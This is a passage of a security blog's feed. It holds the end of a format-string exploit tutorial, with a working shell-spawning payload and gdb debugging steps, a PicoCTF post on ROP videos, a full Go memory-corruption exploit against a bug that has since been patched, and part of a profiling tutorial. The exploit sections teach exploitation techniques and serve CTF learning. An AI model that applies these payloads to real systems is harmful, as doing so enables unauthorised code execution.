&lt;span class="go"&gt;13068&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now we plug these values into our payload, change the &lt;code&gt;%hp&lt;/code&gt; to &lt;code&gt;%hn&lt;/code&gt;. Note that when 
we change the &lt;code&gt;%00000x&lt;/code&gt; to &lt;code&gt;%08772&lt;/code&gt;, we leave the leading &lt;code&gt;0&lt;/code&gt; so that our string
stays the same length. Here is the final exploit:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; env -i ./a.out &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;python -c &lt;span class="s1"&gt;&amp;#39;import sys; sys.stdout.write(&amp;quot;sh;#\x04\xa0\x04\x08\x06\xa0\x04\x08%08772x%99$hn%13068x%100$hn&amp;quot;)&amp;#39;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;sh;#&lt;/span&gt;..&amp;lt;garbage&amp;gt;..sh-4.2$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Woo hoo, we got our shell!&lt;/p&gt;
&lt;h1&gt;Debugging an exploit&lt;/h1&gt;
&lt;p&gt;Sometimes, things don't go as planned and we don't get a shell. If this
happens, &lt;code&gt;gdb&lt;/code&gt; is your friend. Unfortunately, &lt;code&gt;gdb&lt;/code&gt; isn't a very good friend.
It helpfully puts stuff in your environment, so any careful calculations you
were doing related to the stack may no longer be valid. In order to resolve
this, you need to make sure your environment looks like the environment used 
by &lt;code&gt;gdb&lt;/code&gt;. We
first see what the stack looks like under &lt;code&gt;gdb&lt;/code&gt; and then always run our exploit
with that environment:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; env -i /usr/bin/printenv
&lt;span class="gp"&gt;$&lt;/span&gt; gdb -q /usr/bin/printenv
&lt;span class="go"&gt;Reading symbols from /usr/bin/printenv...(no debugging symbols found)...done.&lt;/span&gt;
&lt;span class="go"&gt;(gdb) unset env&lt;/span&gt;
&lt;span class="go"&gt;Delete all environment variables? (y or n) y&lt;/span&gt;
&lt;span class="go"&gt;(gdb) r&lt;/span&gt;
&lt;span class="go"&gt;Starting program: /usr/bin/printenv &lt;/span&gt;
&lt;span class="go"&gt;PWD=/home/ppp&lt;/span&gt;
&lt;span class="go"&gt;SHLVL=0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now that we know the environment used by &lt;code&gt;gdb&lt;/code&gt;, we can make sure to always 
execute our payload with the same environment so we can test our exploit in
&lt;code&gt;gdb&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; env -i &lt;span class="nv"&gt;PWD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;pwd&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;SHLVL&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt; ./a.out &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;python -c &lt;span class="s1"&gt;&amp;#39;print &amp;quot;my_exploit_string&amp;quot;&amp;#39;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="c1"&gt;# Outside gdb.&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; gdb ./a.out &lt;span class="c1"&gt;# Inside gdb.&lt;/span&gt;
&lt;span class="go"&gt;(gdb) unset env&lt;/span&gt;
&lt;span class="go"&gt;Delete all environment variables? (y or n) y&lt;/span&gt;
&lt;span class="go"&gt;(gdb) r &amp;quot;$(/usr/bin/python -c &amp;#39;print &amp;quot;my_exploit_string&amp;quot;&amp;#39;)&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The most helpful thing to do in &lt;code&gt;gdb&lt;/code&gt; is to break just before the call to
&lt;code&gt;printf&lt;/code&gt; and make sure the argument and the stack stack is what you 
expect (if you expect to use &lt;code&gt;%10$hn&lt;/code&gt;, make sure the value you control is the 10th argument after the format
string).
If that works, then break right after the call to &lt;code&gt;printf&lt;/code&gt; and make sure the value you expect is at the target address.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;Breakpoint 1, 0x080484ae in main ()&lt;/span&gt;
&lt;span class="go"&gt;(gdb) x/2i $pc&lt;/span&gt;
&lt;span class="go"&gt;=&amp;gt; 0x80484ae &amp;lt;main+74&amp;gt;: call   0x8048360 &amp;lt;printf@plt&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;   0x80484b3 &amp;lt;main+79&amp;gt;: mov    $0x0,%eax&lt;/span&gt;
&lt;span class="go"&gt;(gdb) x/a $esp&lt;/span&gt;
&lt;span class="go"&gt;0xffffdb70: 0xffffdb98&lt;/span&gt;
&lt;span class="go"&gt;(gdb) x/s 0xffffdb98&lt;/span&gt;
&lt;span class="go"&gt;0xffffdb98:  &amp;quot;AAAA%10$p&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;(gdb) x/11a $esp&lt;/span&gt;
&lt;span class="go"&gt;0xffffdb70: 0xffffdb98  0xffffdddd  0x64    0xf7ec1289&lt;/span&gt;
&lt;span class="go"&gt;0xffffdb80: 0xffffdbbf  0xffffdbbe  0x0 0xffffdca4&lt;/span&gt;
&lt;span class="go"&gt;0xffffdb90: 0xffffdc44  0x0 0x41414141&lt;/span&gt;
&lt;span class="go"&gt;(gdb) x/a $esp + 40&lt;/span&gt;
&lt;span class="go"&gt;0xffffdb98: 0x41414141&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="footnote"&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id="fn-1"&gt;
&lt;p&gt;You'll note the single quotes - &lt;code&gt;$&lt;/code&gt; is a special symbol on the shell and would otherwise need to be escaped.&amp;#160;&lt;a class="footnote-backref" href="#fnref-1" title="Jump back to footnote 1 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id="fn-2"&gt;
&lt;p&gt;You'll note that we use print the exploit string in a python subshell. 
This isn't strictly necessary in this case, but for more interesting exploits the ability to print escape characters
and use arbitrary bytes in our payload is very useful. We also print via &lt;code&gt;sys.stdout.write&lt;/code&gt; to prevent the newline
at the end we would get if we otherwise used &lt;code&gt;print&lt;/code&gt; and surround the subshell in double quotes in case the payload had
whitespace in it.&amp;#160;&lt;a class="footnote-backref" href="#fnref-2" title="Jump back to footnote 2 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;</content><category term="exploitation"></category><category term="tutorial"></category></entry><entry><title>PicoCTF Videos</title><link href="https://codearcana.com/posts/2013/04/28/picoctf-videos.html" rel="alternate"></link><published>2013-04-28T00:00:00-07:00</published><updated>2013-04-28T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2013-04-28:/posts/2013/04/28/picoctf-videos.html</id><summary type="html">&lt;p&gt;For PicoCTF this year, I made some slides and recorded some video tutorials.&lt;/p&gt;</summary><content type="html">&lt;p&gt;For &lt;a href="picoctf.com"&gt;PicoCTF&lt;/a&gt; this year, I made some slides and recorded some
video tutorials. I'll probably turn these into better tutorials on this blog at
some later point.&lt;/p&gt;
&lt;h1&gt;Introduction to Return Oriented Programming (ROP)&lt;/h1&gt;
&lt;!-- &lt;video width="100%" controls&gt;
  &lt;source src="https://dl.dropboxusercontent.com/u/15197322/easy_rop.mp4"&gt;
&lt;/video&gt; --&gt;

&lt;iframe src="http://player.vimeo.com/video/65014453" width="500" height="375"
frameborder="0" webkitAllowFullScreen mozallowfullscreen
allowFullScreen&gt;&lt;/iframe&gt;

&lt;p&gt;&lt;a href="https://dl.dropboxusercontent.com/u/15197322/easy_rop.pdf"&gt;slides&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;Introduction to Format String Vulnerabities&lt;/h1&gt;
&lt;!-- &lt;video controls width="100%"&gt;
  &lt;source src="https://dl.dropboxusercontent.com/u/15197322/easy_format.mp4"&gt;
&lt;/video&gt; --&gt;

&lt;iframe src="http://player.vimeo.com/video/65014452" width="500" height="375"
frameborder="0" webkitAllowFullScreen mozallowfullscreen
allowFullScreen&gt;&lt;/iframe&gt;

&lt;p&gt;&lt;a href="https://dl.dropboxusercontent.com/u/15197322/easy_format.pdf"&gt;slides&lt;/a&gt; &lt;a href="https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html"&gt;tutorial&lt;/a&gt;&lt;/p&gt;</content><category term="exploitation"></category><category term="tutorial"></category></entry><entry><title>Exploiting a Go Binary</title><link href="https://codearcana.com/posts/2013/04/23/exploiting-a-go-binary.html" rel="alternate"></link><published>2013-04-23T00:00:00-07:00</published><updated>2013-04-23T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2013-04-23:/posts/2013/04/23/exploiting-a-go-binary.html</id><summary type="html">&lt;p&gt;Earlier this year, tylerni7 showed us a proof of concept for a 32 bit Go exploit using &lt;a href="https://code.google.com/p/go/issues/detail?id=5336"&gt;this issue&lt;/a&gt;. geohot and I had a wager over who could get the first remote code execution on &lt;a href="http://play.golang.org"&gt;play.golang.org&lt;/a&gt;: he won, but just barely ;-). Props also to ricky for helping to find the underlying cause/writing the patch. Here is a summary of how we did it.&lt;/p&gt;</summary><content type="html">&lt;h3&gt;Introduction&lt;/h3&gt;

&lt;p&gt;Earlier this year, tylerni7 showed us a proof of concept for a 32 bit Go
exploit using &lt;a href="https://code.google.com/p/go/issues/detail?id=5336"&gt;this
issue&lt;/a&gt;. geohot and I had a wager over who could get the first remote code
execution on &lt;a href="http://play.golang.org"&gt;play.golang.org&lt;/a&gt;: he won, but
just barely ;-). Props also to ricky for helping to find the underlying
cause/writing the patch. Here is a summary of how we did it.&lt;/p&gt;
&lt;p&gt;Note: &lt;a href="http://play.golang.org"&gt;play.golang.org&lt;/a&gt; is properly sandboxed, so 
code execution there does not
actually let you do anything. Had this been a more serious bug that could
actually be used for anything malicious, we would have immediately reported it
privately. Neither specific vulnerability nor the technique used here work in the latest version of Go (the vulnerability was patched and Go 1.1 introduced non-executable heaps).&lt;/p&gt;
&lt;p&gt;This post is cross posted on the &lt;a href="http://ppp.cylab.cmu.edu/wordpress/?p=1087"&gt;PPP blog&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;The Bug&lt;/h3&gt;

&lt;p&gt;Go has support for embedded structs. You can define an embedded struct as follows:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;Embedded&lt;/span&gt; &lt;span class="kd"&gt;struct&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="nx"&gt;foo&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;Struct&lt;/span&gt; &lt;span class="kd"&gt;struct&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="nx"&gt;Embedded&lt;/span&gt;
   &lt;span class="nx"&gt;bar&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;instance&lt;/span&gt; &lt;span class="nx"&gt;Struct&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;
It is valid to do both &lt;tt&gt;instance.bar&lt;/tt&gt; and &lt;tt&gt;instance.foo&lt;/tt&gt;.&lt;/p&gt;

&lt;p&gt;The problem comes when you try something slightly trickier:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;Embedded&lt;/span&gt; &lt;span class="kd"&gt;struct&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="nx"&gt;foo&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;Struct&lt;/span&gt; &lt;span class="kd"&gt;struct&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="nx"&gt;Embedded&lt;/span&gt;
   &lt;span class="nx"&gt;bar&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;instance&lt;/span&gt; &lt;span class="nx"&gt;Struct&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;
When you access &lt;tt&gt;instance.foo&lt;/tt&gt; (a member of an uninitialized struct), it incorrectly offsets from 0 rather than from the base of an &lt;tt&gt;Embedded&lt;/tt&gt; struct. Normally, when dereferencing a pointer inside a struct, the go compiler
emits guard code which will cause a segfault if the pointer is nil.
However, this code is not emitted when the pointer is the first element
of the struct, since it's assumed that this will cause a segfault
whenever it is used anyway.  This assumption is not always valid, as the
pointer can be to a large struct such that the offsets of members of the large
struct are valid addresses.
&lt;/p&gt;

&lt;h3&gt;The Vulnerability&lt;/h3&gt;

&lt;p&gt;We define an enormous struct and use it to offset memory:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;Embedded&lt;/span&gt; &lt;span class="kd"&gt;struct&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="nx"&gt;offset&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x400100&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="kt"&gt;byte&lt;/span&gt;
   &lt;span class="nx"&gt;address&lt;/span&gt; &lt;span class="kt"&gt;uint32&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;Struct&lt;/span&gt; &lt;span class="kd"&gt;struct&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="nx"&gt;Embedded&lt;/span&gt;
   &lt;span class="nx"&gt;bar&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;instance&lt;/span&gt; &lt;span class="nx"&gt;Struct&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;
Now we can do &lt;tt&gt;instance.address = 0xdeadbeef&lt;/tt&gt; and we have written to &lt;tt&gt;0x400100&lt;/tt&gt;! This is the arbitrary write primitive we need.&lt;/p&gt;

&lt;h3&gt;The Exploit&lt;/h3&gt;

&lt;p&gt;Once you have an arbitrary write in go, it is &lt;em&gt;really easy&lt;/em&gt; to get arbitrary code execution. We put a function pointer in our data segment (we wanted to put it in the heap, but that didn't work on 64bit Go - apparently the size of a struct is limited to 32 bits. Luckily, the data segment is in the lower 32 bits) and change it to point to our shell code using the arbitrary write. Since Go has &lt;em&gt;no randomization&lt;/em&gt; at all, this is as simple as running the program twice. Full exploit below:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;package&lt;/span&gt; &lt;span class="nx"&gt;main&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;fmt&amp;quot;&lt;/span&gt;

&lt;span class="c1"&gt;// Address to write, computed from a previous run.&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;addr_to_overwrite&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x50e2f0&lt;/span&gt;
&lt;span class="c1"&gt;// &amp;amp;shellcode, computed from a previous run.&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;val_to_overwrite&lt;/span&gt; &lt;span class="kt"&gt;uint64&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0xc200035160&lt;/span&gt;

&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;Embedded&lt;/span&gt; &lt;span class="kd"&gt;struct&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="nx"&gt;offset&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;addr_to_overwrite&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="kt"&gt;byte&lt;/span&gt;
   &lt;span class="nx"&gt;payload&lt;/span&gt; &lt;span class="kt"&gt;uint64&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;Nested&lt;/span&gt; &lt;span class="kd"&gt;struct&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="c1"&gt;// This magic is necessary is because there is an explict null check if&lt;/span&gt;
  &lt;span class="c1"&gt;// if the offset is greater than 0x1000.&lt;/span&gt;
  &lt;span class="nx"&gt;Embedded&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;Struct&lt;/span&gt; &lt;span class="kd"&gt;struct&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
 &lt;span class="c1"&gt;// The issue is that a reference to the embeded struct pointer here&lt;/span&gt;
 &lt;span class="c1"&gt;// will be offset from null (rather than the true base of the struct).&lt;/span&gt;
 &lt;span class="c1"&gt;// We thus just make sizeof(the embedded struct) large enough to point&lt;/span&gt;
 &lt;span class="c1"&gt;// to the address we want to overwrite.&lt;/span&gt;
 &lt;span class="c1"&gt;//&lt;/span&gt;
 &lt;span class="c1"&gt;// See https://code.google.com/p/go/issues/detail?id=5336&lt;/span&gt;
 &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="nx"&gt;Nested&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;unused&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="kd"&gt;func&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{}&lt;/span&gt;

&lt;span class="kd"&gt;func&lt;/span&gt; &lt;span class="nx"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
 &lt;span class="nx"&gt;s&lt;/span&gt; &lt;span class="o"&gt;:=&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nx"&gt;Struct&lt;/span&gt;&lt;span class="p"&gt;{}&lt;/span&gt;
 &lt;span class="nx"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;:=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;\x90\x90\x90\x90\x90\x90\x90\xeb\xfe&amp;quot;&lt;/span&gt;

 &lt;span class="nx"&gt;fmt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Println&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;You should overwrite this: &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nx"&gt;unused&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;span class="nx"&gt;fmt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Println&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;With this: &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nx"&gt;shellcode&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

 &lt;span class="nx"&gt;fmt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Println&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;***********************************************&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
 &lt;span class="nx"&gt;fmt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Println&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Overwriting &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nx"&gt;s&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot; with &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;val_to_overwrite&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

 &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nx"&gt;s&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;val_to_overwrite&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

 &lt;span class="nx"&gt;unused&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;What Now?&lt;/h3&gt;

&lt;p&gt;Well, clearly the &lt;a href="https://code.google.com/p/go/source/detail?r=37bf155bc78073d51c0b5706a4f3fba19cca67f4"&gt;issue&lt;/a&gt;
was fixed. I also think it is important for Go to add the protections
that come now standard with C binaries (ASLR, NX) - I posted 
&lt;a href="https://codearcana.com/posts/2012/05/06/securing-and-exploiting-go-binaries.html"&gt;an article&lt;/a&gt; 
earlier about security in Go where I strongly advocated those protections. 
Luckily, Go 1.1. will be adding some of these protections: specificially, the 
above exploit will not work because &lt;a href="https://groups.google.com/forum/?fromgroups=#!topic/golang-nuts/o2Q5oc36Qt0"&gt;Go 1.1  uses a non-executable heap and stack&lt;/a&gt;.&lt;/p&gt;</content><category term="golang"></category><category term="exploitation"></category></entry><entry><title>Introduction to Using Profiling Tools</title><link href="https://codearcana.com/posts/2013/02/26/introduction-to-using-profiling-tools.html" rel="alternate"></link><published>2013-02-26T00:00:00-08:00</published><updated>2013-02-26T00:00:00-08:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2013-02-26:/posts/2013/02/26/introduction-to-using-profiling-tools.html</id><summary type="html">&lt;p&gt;In this article, you will see several performance tools used to identify bottlenecks in a simple program.&lt;/p&gt;</summary><content type="html">&lt;h2&gt;Performance tools&lt;/h2&gt;
&lt;p&gt;Frequently, we need to identify slow portions of our programs so we can improve performance. There are a number of tools available to profile programs and identify how much time is spent where. The most common of these tools sample the program periodically, recording information to be later analyzed. Typically, they involve a phase spent recording data and a later phase for analyzing it. We will use two common tools to analyze a simple program: Google &lt;code&gt;pprof&lt;/code&gt; and Linux &lt;code&gt;perf&lt;/code&gt;.&lt;/p&gt;
&lt;h3&gt;Google &lt;code&gt;pprof&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;Google &lt;code&gt;pprof&lt;/code&gt; is a tool available as part of the Google &lt;a href="https://code.google.com/p/gperftools/"&gt;&lt;code&gt;perftools&lt;/code&gt;&lt;/a&gt; package. It is is used with
&lt;code&gt;libprofiler&lt;/code&gt;, a sampling based profiler that is linked into your binary. There are 3 steps for using &lt;code&gt;pprof&lt;/code&gt;: linking it into the binary, generating profile output, and analyzing the output. The following links a binary with &lt;code&gt;libprofiler&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;%&lt;/span&gt; gcc main.c -lprofiler
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;For any profile linked with &lt;code&gt;libprofiler&lt;/code&gt;, setting the environment variable &lt;code&gt;CPUPROFILE&lt;/code&gt; enables profiling and specifies the output file. The following command runs &lt;code&gt;./a.out&lt;/code&gt; and prints profiling data to &lt;code&gt;out.prof&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;%&lt;/span&gt; &lt;span class="nv"&gt;CPUPROFILE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;out.prof ./a.out
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We can now analyze this file using &lt;code&gt;pprof&lt;/code&gt;. Below, we output the sample counts for all the functions in &lt;code&gt;a.out&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;%&lt;/span&gt; pprof --text ./a.out out.prof
&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
&lt;span class="go"&gt;Total: 311 samples&lt;/span&gt;
&lt;span class="go"&gt;  144  46.3%  46.3%      144  46.3% bar&lt;/span&gt;
&lt;span class="go"&gt;   95  30.5%  76.8%       95  30.5% foo&lt;/span&gt;
&lt;span class="go"&gt;   72  23.2% 100.0%      311 100.0% baz&lt;/span&gt;
&lt;span class="go"&gt;    0   0.0% 100.0%      311 100.0% __libc_start_main&lt;/span&gt;
&lt;span class="go"&gt;    0   0.0% 100.0%      311 100.0% _start&lt;/span&gt;
&lt;span class="go"&gt;    0   0.0% 100.0%      311 100.0% main&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;See full documentation &lt;a href="https://google-perftools.googlecode.com/svn/trunk/doc/cpuprofile.html"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;Linux &lt;code&gt;perf&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;On Linux, the &lt;code&gt;perf&lt;/code&gt; system is a powerful tool for analyzing program / system performance. It provides some nice abstractions over tracking hardware counters on different CPUs. It defines a number of events to be tracked and recorded. Run &lt;code&gt;perf list&lt;/code&gt; to see a list of the events allowed on your system. &lt;/p&gt;
&lt;p&gt;To use &lt;code&gt;perf&lt;/code&gt;, you run: &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;%&lt;/span&gt; perf stat ./a.out
&lt;span class="go"&gt; Performance counter stats for &amp;#39;./a.out&amp;#39;:&lt;/span&gt;

&lt;span class="go"&gt;    3121.725439 task-clock                #    0.997 CPUs utilized          &lt;/span&gt;
&lt;span class="go"&gt;             11 context-switches          #    0.000 M/sec                  &lt;/span&gt;
&lt;span class="go"&gt;              7 CPU-migrations            #    0.000 M/sec                  &lt;/span&gt;
&lt;span class="go"&gt;            308 page-faults               #    0.000 M/sec                  &lt;/span&gt;
&lt;span class="go"&gt;  9,121,960,506 cycles                    #    2.922 GHz                     [83.32%]&lt;/span&gt;
&lt;span class="go"&gt;  5,213,187,548 stalled-cycles-frontend   #   57.15% frontend cycles idle    [83.32%]&lt;/span&gt;
&lt;span class="go"&gt;    292,952,401 stalled-cycles-backend    #    3.21% backend  cycles idle    [66.68%]&lt;/span&gt;
&lt;span class="go"&gt;  5,215,556,086 instructions              #    0.57  insns per cycle        &lt;/span&gt;
&lt;span class="gp"&gt;                                          #&lt;/span&gt;    1.00  stalled cycles per insn &lt;span class="o"&gt;[&lt;/span&gt;83.35%&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="go"&gt;  1,303,060,483 branches                  #  417.417 M/sec                   [83.35%]&lt;/span&gt;
&lt;span class="go"&gt;         66,559 branch-misses             #    0.01% of all branches         [83.33%]&lt;/span&gt;

&lt;span class="go"&gt;    3.132028707 seconds time elapsed&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;In addition to &lt;code&gt;perf stat&lt;/code&gt;, there quite a few other ways to use perf. Run &lt;/p&gt;
